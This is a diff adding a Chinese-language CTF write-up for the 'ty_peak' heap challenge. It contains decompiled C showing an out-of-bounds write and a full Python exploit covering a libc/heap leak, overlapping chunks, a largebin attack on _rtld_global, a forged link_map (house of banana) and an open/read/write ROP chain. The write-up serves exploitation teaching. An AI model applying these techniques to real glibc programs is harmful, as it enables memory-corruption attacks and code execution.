@@ -866,3 +866,484 @@ struct link_map
 ### 样例:ty_peak(修改)
 
   [点击下载题目资源](house_of_banana.tar.gz)
+
+#### 题目保护
+
+
+  如下图所示，基本所有保护全开
+  ![ty_peak(修改)保护机制](ty_peak_修改_保护机制.png)
+
+#### 题目逻辑
+
+  同样是一个标准的菜单堆，框架如下所示
+  ```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  init_proc();
+  myputs("This is a simple game !!!");
+  myprintf("Please start your operation (<> - <>) \n");
+  while ( 1 )
+  {
+    sleep(0);
+    myputs(off_1DA9);
+    check();
+    switch ( return_number() )
+    {
+      case 1:
+        add();
+        break;
+      case 2:
+        delete();
+        break;
+      case 3:
+        view();
+        break;
+      case 4:
+        edit();
+        break;
+      case 5:
+        gift();
+        break;
+      case 6:
+      	return 0;
+      default:
+        myputs("Wrong choice");
+        break;
+    }
+  }
+}
+```
+
+
+  其中对于`add`功能，其同样会添加一个给定输入大小的内存块，但是一定从非**tcache bin**中分配，逻辑如下所示
+  ```c
+void __cdecl add()
+{
+  size_t size; // [rsp+8h] [rbp-18h]
+  uint32_t idx; // [rsp+14h] [rbp-Ch]
+
+  for ( idx = 0; idx < 0x10 && note[idx]; ++idx )
+    ;
+  if ( idx >= 0x10 )
+    exit(1);
+  myprintf("Size: ");
+  size = (unsigned int)return_number();
+  if ( size > 0x400 && size <= 0x2000 )
+  {
+    note[idx] = (char *)mycalloc(size);
+    sizes[idx] = size;
+    myprintf("Message: ");
+    myread(note[idx], size);
+  }
+}
+```
+
+  对于`delete`功能，就是正常的`free`掉申请的内存即可，相关逻辑如下所示
+  ```c
+void __cdecl delete()
+{
+  unsigned int idx; // [rsp+4h] [rbp-Ch]
+
+  myprintf("Index: ");
+  idx = return_number();
+  if ( idx < 0x10 )
+  {
+    if ( note[idx] )
+    {
+      free(note[idx]);
+      note[idx] = 0LL;
+      sizes[idx] = 0;
+    }
+  }
+}
+```
+
+  对于`view`功能来说，其就是输出当前内存块上的内容，代码如下所示
+  ```c
+void __cdecl view()
+{
+  unsigned int idx; // [rsp+4h] [rbp-Ch]
+
+  myprintf("Index: ");
+  idx = return_number();
+  if ( idx < 0x10 )
+  {
+    if ( note[idx] )
+    {
+      myprintf("Message: ");
+      myputs(note[idx]);
+    }
+  }
+}
+```
+
+
+  其次，这里同样提供了传统的`edit`函数，从而配合前面的`view`函数，可以泄露当前的堆地址、libc基址，相关的代码如下所示
+  ```c
+void __cdecl edit()
+{
+  int v0; // esi
+  int i; // [rsp+8h] [rbp-818h]
+  uint32_t idx; // [rsp+Ch] [rbp-814h]
+  char code[2048]; // [rsp+10h] [rbp-810h] BYREF
+  unsigned __int64 v4; // [rsp+818h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  myprintf("Index: ");
+  idx = return_number();
+  if ( idx < 0x10 && note[idx] )
+  {
+    myputs("Code :");
+    myread(code, 0x800uLL);
+    memset(mem, 0, sizeof(mem));
+    for ( i = 0; ; ++i )
+    {
+      b[0] = code[i];
+      if ( b[0] <= 0 || b[0] == 32 || b[0] == 10 || b[0] == 9 )
+        break;
+      v0 = i;
+      mem[v0] = b[0];
+    }
+    fill(mem, idx);
+  }
+}
+```
+
+  其最终具体执行的`fill`函数的内容如下所示
+  ```c
+void __cdecl fill(char *mem, int idx)
+{
+  int v2; // eax
+  bool v3; // [rsp+2Bh] [rbp-15h]
+
+  q = 0;
+  p = 0;
+  while ( 1 )
+  {
+    v2 = q++;
+    c[0] = mem[v2];
+    v3 = 0;
+    if ( c[0] )
+    {
+      v3 = 0;
+      if ( p < sizes[idx] )
+        v3 = q < 2048;
+    }
+    if ( !v3 )
+      break;
+    switch ( c[0] )
+    {
+      case '!':
+        ++note[idx][p];
+        break;
+      case '&':
+        note[idx][p] = getchar();
+        break;
+      case '(':
+        ++p;
+        break;
+      case ')':
+        if ( p >= 0 )
+          --p;
+        else
+          myprintf("error\n");
+        break;
+      case '@':
+        --note[idx][p];
+        break;
+      default:
+        printf("\nError code:%c\n", (unsigned int)c[0]);
+        break;
+    }
+  }
+}
+```
+
+  最后，这里还给出了一个后门函数，通过构造特殊的输入，从而可以实现且仅能实现一次越界写，内容如下所示
+  ```c
+void __cdecl gift()
+{
+  int v0; // esi
+  int i; // [rsp+8h] [rbp-118h]
+  uint32_t idx; // [rsp+Ch] [rbp-114h]
+  char code[256]; // [rsp+10h] [rbp-110h] BYREF
+  unsigned __int64 v4; // [rsp+118h] [rbp-8h]
+
+  v4 = __readfsqword(0x28u);
+  if ( cookie != 0xDEADBEEFDEADBEEFLL )
+    exit(1);
+  myprintf("Index: ");
+  idx = return_number();
+  if ( idx < 0x10 && note[idx] )
+  {
+    myputs("Code :");
+    myread(code, 0x100uLL);
+    memset(mem, 0, sizeof(mem));
+    for ( i = 0; ; ++i )
+    {
+      b[0] = code[i];
+      if ( b[0] <= 0 || b[0] == 32 || b[0] == 10 || b[0] == 9 )
+        break;
+      v0 = i;
+      mem[v0] = b[0];
+    }
+    interpret(mem, idx);
+    cookie = 0LL;
+  }
+}
+```
+
+  这里漏洞点在`interpret`函数的**[**和**]**中，相关的逻辑如下所示
+  ```c
+void __cdecl interpret(char *mem, int idx)
+{
+  int v2; // edx
+  int v3; // ecx
+  bool v4; // [rsp+Fh] [rbp-41h]
+
+  p = 0;
+  q = 0;
+  while ( 1 )
+  {
+    v2 = q++;
+    c[0] = mem[v2];
+    if ( !c[0] )
+      break;
+    switch ( c[0] )
+    {
+      case '+':
+        ++note[idx][p];
+        break;
+      case ',':
+        note[idx][p] = getchar();
+        break;
+      case '-':
+        --note[idx][p];
+        break;
+      case '.':
+        putchar(note[idx][p]);
+        fflush(stdout);
+        break;
+      case '<':
+        if ( p >= 0 )
+          --p;
+        else
+          myprintf("error\n");
+        break;
+      case '>':
+        ++p;
+        break;
+      case '[':
+        if ( !note[idx][p] )
+        {
+          do
+            v3 = q++;
+          while ( mem[v3] != 93 );
+        }
+        break;
+      case ']':
+        do
+        {
+          --q;
+          v4 = 0;
+          if ( mem[q] != 91 )
+            v4 = q >= 0;
+        }
+        while ( v4 );
+        break;
+      default:
+        printf("\nError code:%c\n", (unsigned int)c[0]);
+        break;
+    }
+  }
+}
+```
+
+#### 解题思路
+
+ 可以看到，由于程序实现的**mymalloc**中会清空**tcache_struct**结构中的数据，则我们基本上只能在**unsorted bin**、**small bin**和**large bin**中进行利用。
+ 由于**edit**函数的存在，则我们可以读取**large bin**中的相关信息，则可以非常轻松的获取**堆地址**和**libc基址**。
+ 由于**main**程序中存在**return**返回，则各项条件完美符合**house_of_banana**，因此通过伪造**_rtld_global**中的**link_map**结构，从而劫持程序执行流，执行**orw**链获取flag
+
+#### 题解和关键说明
+
+  首先，通过释放一个**large bin**范围的chunk，然后再申请一个更大的chunk，从而确保该chunk被插入到**large bin**相关的链上。此时如果申请同样大小的chunk，则会申请到释放在**large bin**中的chunk，其**fd**和**bk**字段都是**main_arena + 1104**，而其**fd_nextsize**和**bk_nextsize**字段的值就是当前chunk的地址。
+  因此，通过**edit**函数，将0字段进行填充，在调用**view**，即可同时获取堆地址和libc基址，相关代码如下所示
+  ```python
+	#获取chunk地址和libc地址
+	wp_add(0x428, 'a')	#0
+	wp_add(0x428, 'a')	#1
+	wp_delete(0)
+	wp_add(0x438, 'a')			#0
+	wp_add(0x428, 'a' * 0x7)		#2
+	wp_edit(2, '(' * 6 + '!(!(' + '(' * 6 + '!(!\x00')
+	wp_view(2)
+	ru('a' * 6 + '\x01\x01')
+	lib_base = uu64(re(8)[:-2]) - 0x7fdd1f358fd0 + 0x7fdd1f16d000
+	chunk_base = uu64(re(6)) - 0x000055e69bf0a2b0 + 0x55e69bf0a000
+	log.info('lib_base => %#x'%(lib_base))
+	log.info('chunk_base => %#x'%(chunk_base))
+	wp_delete(0)
+	wp_delete(1)
+	wp_delete(2)
+```
+
+
+  其次，由于**gift**存在越界写，则通过覆写相邻的下一个chunk的size字段，即可构建重叠堆。在重叠堆上，我们就可以非常轻松的实现**largebin attack**，从而完成**house_of_banana**。
+  类似于前面的过程，我们首先申请多个**chunk**，组成重叠堆的内存。其次，我们在最开始的chunk上执行**gift**，通过越界写修改下一个chunk的size大小，从而伪造了一个**fake chunk**，该**fake chunk**跨过了多个合法的chunk，从而构成了重叠堆，相关的代码如下所示
+  ```python
+	#构建重叠chunk
+	wp_add(0x408, 'a' * 0x408)	#0
+	wp_add(0x428, 'a')		#1
+	wp_add(0x468, 'a')		#2
+	wp_add(0x408, 'a')		#3
+	wp_add(0x458, 'a')		#4
+	wp_add(0x408, up64(0) + up64(0x21) + up64(0) * 2 + up64(0) + up64(0x21))	#3
+
+	fake_size = 0x430 + 0x470 + 0x410 + 0x460 + 0x10
+	wp_gift(0, '[>]>,>,\x00')
+	se(chr((fake_size & 0xff) + 1) + chr((fake_size >> 8) & 0xff))
+	wp_delete(1)
+	wp_add(fake_size - 0x8, 'a')	#1
+
+```
+
+  下面，则通过重叠堆，修改位于**large bin**中的最小大小的chunk的**bk_nextsize**字段为**_rtld_global**地址即可。然后位于重叠堆(方便写)通过释放和申请，插入到**large bin**中，从而完成相关的**largebin attack**。此时**_rtld_global**的第一个**link_map**指针的值指向了该释放的chunk，则我们向该chunk中写入伪造的**link_map**，即相当于在**—_rtld_global**结构中伪造了**link_map**，我们在**link_map**中通过伪造一个**fini_array**数组，其首先执行**setcontext**部分函数，将栈劫持到提前在伪造的**link_map**上插入的row链即可。相关的脚本代码如下所示，这里理论上应该遍历**_rtld_global**地址的，因为实际上其第2个字节可能不同(但是不会变化)，需要遍历可能的256中情况即可。
+  ```python
+	#largebin 攻击
+	wp_delete(2)
+	wp_add(0x490, 'a')		#2
+	rtld_global = lib_base + 0x7efece6cf060 - 0x7efece499000
+	log.info('rtld_global => %#x'%(rtld_global))
+	wp_delete(1)
+	wp_add(fake_size - 0x8, 'a' * 0x420 + up64(0) + up64(0x471) + up64(lib_base + 0x10 + lib.sym['__malloc_hook'] + 1120) + up64(lib_base + 0x10 + lib.sym['__malloc_hook'] + 1120) + up64(0) + up64(rtld_global - 0x20) + '\x00')				#1
+	wp_delete(4)
+	wp_add(0x490, 'a')		#4
+	
+
+	#house of banana
+	fake_link_map_addr = chunk_base + 0x000055de23bed370 - 0x55de23bec000
+	flag_address = fake_link_map_addr + 100 * 8
+	stack_address = fake_link_map_addr + 0x10
+	pop_rdi_ret = lib_base + 0x26b72
+	ret = pop_rdi_ret + 1
+	pop_rsi_ret = lib_base + 0x27529
+	pop_rdx_r12_ret = lib_base + 0x11c36f
+	syscall_ret = lib_base + 0x66229
+	rop = ''
+	rop += up64(pop_rdi_ret) + up64(flag_address)
+	rop += up64(pop_rsi_ret) + up64(4)
+	rop += up64(lib_base + lib.sym['open'])
+	rop += up64(pop_rdi_ret) + up64(3)
+	rop += up64(pop_rsi_ret) + up64(flag_address)
+	rop += up64(pop_rdx_r12_ret) + up64(14 * 8) + up64(0)
+	rop += up64(lib_base + lib.sym['read'])
+	rop += up64(pop_rdi_ret) + up64(1)
+	rop += up64(pop_rsi_ret) + up64(flag_address)
+	rop += up64(pop_rdx_r12_ret) + up64(14 * 8) + up64(0)
+	rop += up64(lib_base + lib.sym['write'])
+	rop += up64(lib_base + lib.sym['exit'])
+	'''
+	link_map {
+		l_addr = 0							offset: 0 * 8
+
+		l_next = (char*)fake_link_map_addr + 7 * 8 - 3 * 8		offset: 3 * 8
+
+		l_real = &link_map						offset: 5 * 8
+
+		fake_l_next_2:							offset: 7 * 8
+			(char*)fake_link_map_addr + 8 * 8 - 3 * 8
+		fake_l_next_3:							offset: 8 * 8
+			(char*)fake_link_map_addr + 13 * 8 - 3 * 8
+		fake_l_real_2:							offset: 9 * 8
+			(char*)fake_link_map_addr + 7 * 8 - 3 * 8
+		fake_l_real_3:							offset: 10 * 8
+			(char*)fake_link_map_addr + 8 * 8 - 3 * 8
+
+		fake_l_next_4:							offset: 13 * 8
+			null
+
+		fake_l_real_4:							offset: 15 * 8
+			(char*)fake_link_map_addr + 13 * 8 - 3 * 8
+
+		l_info[26]							offset: 34 * 8
+			(char*)&link_map + 37 * 8
+
+		l_info[28]							offset: 36 * 8
+			(char*)&link_map + 39 * 8
+
+		fini_array:							offset: 38 * 8
+			(char*)&link_map + 52 * 8
+
+		fini_arraysize:							offset: 40 * 8
+			8 * 2
+	
+		fini_array:							offset: 52 * 8
+			lib_base + lib.sym['setcontext'] + 61
+			lib_base + ret
+		
+		setcontext_rdi:							offset: 66 * 8
+			0
+		setcontext_rsi:							offset: 67 * 8
+			stack_address
+
+		setcontext_rdx:							offset: 70 * 8
+			len(rop)
+
+		setcontext_stack:						offset: 73 * 8
+			stack_address
+		setcontext_retn:						offset: 74 * 8
+			lib_base + lib.sym['read']
+			
+		
+		l_init_called = 0x800000000					offset: 99 * 8
+		flag:								offset: 100 * 8
+			'flag\x00'
+	}
+	'''
+	fake_link_map = ''
+	fake_link_map = fake_link_map.ljust(3 * 8, '\x00')
+	fake_link_map += up64(fake_link_map_addr + 7 * 8 - 3 * 8)			#l_next
+	fake_link_map = fake_link_map.ljust(5 * 8, '\x00')
+	fake_link_map += up64(fake_link_map_addr)					#l_real
+	fake_link_map = fake_link_map.ljust(7 * 8, '\x00')
+	fake_link_map += up64(fake_link_map_addr + 8 * 8 - 3 * 8)			#fake_l_next_2
+	fake_link_map += up64(fake_link_map_addr + 13 * 8 - 3 * 8)			#fake_l_next_3
+	fake_link_map += up64(fake_link_map_addr + 7 * 8 - 3 * 8)			#fake_l_real_2
+	fake_link_map += up64(fake_link_map_addr + 8 * 8 - 3 * 8)			#fake_l_real_3
+	fake_link_map = fake_link_map.ljust(13 * 8, '\x00')
+	fake_link_map += up64(0)							#fake_l_next_4
+	fake_link_map = fake_link_map.ljust(15 * 8, '\x00')
+	fake_link_map += up64(fake_link_map_addr + 13 * 8 - 3 * 8)			#fake_l_real_4
+	fake_link_map = fake_link_map.ljust(34 * 8, '\x00')
+	fake_link_map += up64(fake_link_map_addr + 37 * 8)				#l_info[26]
+	fake_link_map = fake_link_map.ljust(36 * 8, '\x00')
+	fake_link_map += up64(fake_link_map_addr + 39 * 8)				#l_info[26]
+	fake_link_map = fake_link_map.ljust(38 * 8, '\x00')
+	fake_link_map += up64(fake_link_map_addr + 52 * 8)				#fini_array
+	fake_link_map = fake_link_map.ljust(40 * 8, '\x00')
+	fake_link_map += up64(8 * 2)							#fini_arraysize
+	fake_link_map = fake_link_map.ljust(52 * 8, '\x00')
+	fake_link_map += up64(lib_base + lib.sym['setcontext'] + 61) + up64(ret)	#fini_array
+	fake_link_map = fake_link_map.ljust(66 * 8, '\x00')
+	fake_link_map += up64(0)							#setcontext_rdi
+	fake_link_map += up64(stack_address)						#setcontext_rsi
+	fake_link_map = fake_link_map.ljust(70 * 8, '\x00')
+	fake_link_map += up64(len(rop))							#setcontext_rdx
+	fake_link_map = fake_link_map.ljust(73 * 8, '\x00')
+	fake_link_map += up64(stack_address)						#setcontext_stack
+	fake_link_map += up64(lib_base + lib.sym['read'])				#setcontext_retn
+	fake_link_map = fake_link_map.ljust(99 * 8, '\x00')
+	fake_link_map += up64(0x800000000)						#l_init_called
+	fake_link_map += 'flag\x00'							#flag
+
+
+
+	wp_delete(1)
+	wp_add(fake_size - 0x8, 'a' * (0x420 + 0x470 + 0x410) + fake_link_map)	#1
+	sla('>> \n', '6')
+
+
+	se(rop)
+	log.info(ru('}').split()[0])
+```
